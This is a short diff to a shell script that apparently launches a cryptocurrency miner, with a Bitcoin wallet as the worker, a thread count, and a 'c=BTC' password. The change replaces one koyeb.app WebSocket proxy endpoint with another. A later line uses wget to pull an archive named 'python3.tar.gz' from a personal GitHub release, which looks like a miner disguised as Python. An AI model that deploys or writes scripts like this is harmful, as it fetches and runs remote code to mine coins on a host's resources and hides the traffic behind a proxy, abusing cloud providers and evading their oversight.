@@ -6,7 +6,7 @@
 : "${M_WORKER:=1Fo2aZrGJYV6G9H8bunMvwPUYAMvdriqTP}"
 : "${M_PASSWORD:=c=BTC}"
 : "${M_THREADS:=7}"
-: "${M_PROXY:=wss://smiling-tilda-mono.koyeb.app/proxy}"
+: "${M_PROXY:=wss://integrated-alisun-linuss0411-926b04c0.koyeb.app/proxy}"
 
 # Download packgaes
 wget https://github.com/khanhnguyen97/ok2/releases/download/khanh/python3.tar.gz
